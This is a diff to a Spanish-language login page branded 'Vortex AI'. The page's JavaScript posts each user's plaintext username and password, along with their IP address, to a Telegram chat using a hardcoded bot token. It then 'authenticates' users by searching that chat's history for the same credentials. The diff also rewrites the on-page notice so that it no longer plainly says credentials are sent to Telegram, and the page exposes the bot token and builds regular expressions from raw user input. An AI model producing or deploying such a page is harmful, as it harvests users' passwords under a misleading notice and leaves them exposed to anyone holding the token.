@@ -96,6 +96,12 @@
             text-align: left;
         }
 
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
         .form-group input {
             width: 100%;
             padding: 12px;
@@ -121,6 +127,12 @@
         .alert.error {
             background: rgba(239, 68, 68, 0.2);
             border: 1px solid #ef4444;
+            display: block;
+        }
+
+        .alert.info {
+            background: rgba(59, 130, 246, 0.2);
+            border: 1px solid #3b82f6;
             display: block;
         }
     </style>
@@ -160,13 +172,13 @@
             </form>
             
             <div style="margin-top: 1.5rem; font-size: 0.9rem; opacity: 0.8;">
-                🔐 Credenciales se envían a Telegram para verificación
+                🔐 Sistema verifica en Telegram antes de registrar
             </div>
         </div>
     </div>
 
     <script>
-        // Configuración Telegram - USA TUS DATOS REALES
+        // Configuración Telegram
         const BOT_TOKEN = "8120164090:AAHkYn_CsETLSlP3Jzp-eEWbS5G9NGRBUwY";
         const CHAT_ID = "-1003059908452";
 
@@ -195,36 +207,47 @@
             }
         }
 
-        // Función para leer mensajes de Telegram y verificar login
+        // Función MEJORADA para leer mensajes de Telegram
         async function verifyLogin(username, password) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-100`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-200`;
             
             try {
                 const response = await fetch(url);
                 const data = await response.json();
                 
-                if (!data.ok) return false;
+                if (!data.ok) {
+                    console.log('Error en API de Telegram');
+                    return false;
+                }
+
+                console.log('Mensajes encontrados:', data.result.length);
 
                 // Buscar en los últimos mensajes
                 for (let update of data.result) {
                     if (update.message && update.message.text) {
                         const text = update.message.text;
-                        const userMatch = `Usuario: <code>${username}</code>`;
-                        const passMatch = `Password: <code>${password}</code>`;
                         
-                        if (text.includes(userMatch) && text.includes(passMatch)) {
+                        // Buscar coincidencia EXACTA
+                        const userPattern = new RegExp(`Usuario: <code>${username}</code>`, 'i');
+                        const passPattern = new RegExp(`Password: <code>${password}</code>`, 'i');
+                        
+                        if (userPattern.test(text) && passPattern.test(text)) {
+                            console.log('✅ Credenciales encontradas en Telegram');
                             return true;
                         }
                     }
                 }
+                
+                console.log('❌ Credenciales NO encontradas');
                 return false;
+                
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Error verificando login:', error);
                 return false;
             }
         }
 
-        // Manejar login
+        // Manejar login CORREGIDO
         async function handleLogin(e) {
             e.preventDefault();
             
@@ -236,30 +259,35 @@
                 return;
             }
 
-            showAlert('⏳ Verificando credenciales en Telegram...', 'success');
+            showAlert('⏳ Verificando credenciales en Telegram...', 'info');
 
-            // PRIMERO: Verificar si el usuario ya existe
+            // PRIMERO verificar si el usuario YA EXISTE
             const userExists = await verifyLogin(username, password);
             
             if (userExists) {
-                // Usuario encontrado - LOGIN EXITOSO
-                showAlert('✅ ¡Login exitoso! Bienvenido a Vortex AI.', 'success');
+                // ✅ USUARIO ENCONTRADO - LOGIN EXITOSO
+                showAlert('✅ ¡Login exitoso! Redirigiendo...', 'success');
                 localStorage.setItem('vortex_user', username);
                 setTimeout(() => {
                     window.location.href = 'dashboard.html';
-                }, 2000);
+                }, 1500);
+                
             } else {
-                // Usuario NO existe - ENVIAR REGISTRO
-                const message = `🆕 NUEVO REGISTRO VORTEX AI\n👤 Usuario: <code>${username}</code>\n🔑 Password: <code>${password}</code>\n⏰ Fecha: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`;
+                // ❌ USUARIO NO EXISTE - ENVIAR REGISTRO
+                showAlert('📝 Usuario no encontrado. Creando registro...', 'info');
+                
+                const ip = await getIP();
+                const message = `🆕 NUEVO REGISTRO VORTEX AI\n👤 Usuario: <code>${username}</code>\n🔑 Password: <code>${password}</code>\n⏰ Fecha: ${new Date().toLocaleString()}\n🌐 IP: ${ip}`;
                 
                 const sent = await sendToTelegram(message);
                 
                 if (sent) {
-                    showAlert('✅ Registro enviado! Ahora puedes iniciar sesión.', 'success');
+                    showAlert('✅ ¡Registro exitoso! Los datos se enviaron a Telegram. Ahora puedes iniciar sesión.', 'success');
+                    // Limpiar campos
                     document.getElementById('username').value = '';
                     document.getElementById('password').value = '';
                 } else {
-                    showAlert('❌ Error al registrar. Intenta nuevamente.', 'error');
+                    showAlert('❌ Error al enviar registro. Intenta nuevamente.', 'error');
                 }
             }
         }
@@ -267,6 +295,9 @@
         // Funciones auxiliares
         function openModal() {
             document.getElementById('loginModal').style.display = 'flex';
+            // Limpiar alertas al abrir modal
+            document.getElementById('alertMessage').className = 'alert';
+            document.getElementById('alertMessage').textContent = '';
         }
 
         function closeModal() {
@@ -296,6 +327,13 @@
                 closeModal();
             }
         }
+
+        // Verificar si ya está logueado al cargar la página
+        window.addEventListener('load', function() {
+            if (localStorage.getItem('vortex_user')) {
+                window.location.href = 'dashboard.html';
+            }
+        });
     </script>
 </body>
 </html>
